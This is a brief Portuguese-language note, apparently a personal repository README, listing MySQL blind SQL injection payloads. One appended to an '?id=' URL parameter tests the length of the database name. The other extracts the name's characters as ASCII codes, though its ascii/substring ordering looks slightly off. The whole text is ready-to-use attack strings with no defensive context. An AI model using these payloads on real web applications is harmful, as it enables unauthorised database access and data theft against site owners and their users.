# Minhas-payload-sql-injection

# Esse repositório não é cheat sheet de sql injection.

#==============Payload MySQL==============

'''EXTRAINDO número de caracteres DA DATABASE.'''
  ?id=1' AND LENGTH(DATABASE()) > 2 --+
  
#EXTRAINDO OS CARACTERES DO BANCO DE DADOS EM ASCII.
  ?id=1' AND substring(ascii(DATABASE()),1,8) >= 115--+-